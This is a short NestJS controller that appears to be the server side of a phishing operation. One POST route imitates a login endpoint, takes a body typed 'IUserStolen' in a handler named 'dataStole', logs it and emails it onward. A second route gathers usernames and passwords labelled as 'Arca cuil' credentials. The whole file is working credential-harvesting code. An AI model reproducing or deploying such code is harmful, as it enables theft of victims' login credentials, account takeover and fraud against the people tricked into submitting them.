import { Controller, Get, Body, Request, Post, Param } from '@nestjs/common';
import { AppService } from './app.service';
import { IUserStolen } from './utils/interfaces';

@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}

  @Get()
  getHello(): string {
    return this.appService.getHello();
  }

  @Post('/v2/auth-mod/login')
  dataStole(@Body() req: IUserStolen): number {
    console.log(req)
    this.appService.emailData(req)
    return 0;
  }

  @Post('/arca')
  arcaData(@Body() req) {
    this.appService.arcaData('Arca cuil: '+req["F1_username"]+" / "+req['F1_password'])
    return 0;
  }
}
